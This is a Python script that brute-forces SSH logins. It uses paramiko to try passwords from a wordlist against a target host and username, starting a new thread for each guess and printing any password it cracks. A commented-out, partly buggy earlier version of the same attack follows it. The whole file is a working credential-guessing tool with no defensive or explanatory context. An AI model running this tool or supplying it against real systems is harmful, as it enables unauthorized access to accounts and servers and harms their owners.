
import paramiko, sys, os, termcolor
import threading, time

stop_flag = 0

def ssh_connect(password):
    global stop_flag
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(host, port=22, username=username, password=password)
        stop_flag = 1
        print(termcolor.colored(('[+] Found Password: ' + password + ', For Account: ' + username), 'green'))
    except:
        print(termcolor.colored(('[-] Incorrect Login: ' + password), 'red'))
    ssh.close()

host = input('[+] Target Address: ')
username = input('[+] SSH Username: ')
input_file = input('[+] Passwords File: ')
print('\n')

if os.path.exists(input_file) == False:
    print('[!!] That File/Path Doesnt Exist')
    sys.exit(1)

print('* * * Starting Threaded SSH Bruteforce On ' + host + ' With Account: ' + username + '* * *')


with open(input_file, 'r') as file:
    for line in file.readlines():
        if stop_flag == 1:
            t.join()
            exit()
        password = line.strip()
        t = threading.Thread(target=ssh_connect, args=(password,))
        t.start()
        time.sleep(0.5)




# import paramiko, sys, os, socket, termcolor

# def ssh_connect(password, code=0):
#     ssh = paramiko.SSHClient()
#     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
#     try:
#         ssh.connect(host, port=22, username=username, password=password)
#     except paramiko.AuthenticationException:
#         code = 1
#     except socket.error as e:
#         code = 2
        
#         ssh.close()
#         return code

# host = input('[+] Target Address: ')
# username = input('[+] SSH Username: ')
# input_file = input('[+] Passwords File: ')

# if os.path.exists(input_file) == False:
#     print('[!!] The File/Path Doesnt Exist ')
#     sys.exit(1)
    
# with open(input_file, 'r') as file:
#     for line in file.readlines():
#         password = line.strip()
#         try:
#             response = ssh_connect(password)
#             if response == 0:
#                 print(termcolor.colored(('[+] Found Password: ' + password + ' , For Account: ' + username), 'green'))
#                 break
#             elif response == 1:
#                 print('[-] Incorrect Login: ' + password)
#             elif response == 2:
#                 response('[!!] Cant Connect')
#                 sys.exit(1)
#         except Exception as e:
#             print(e)
#             pass


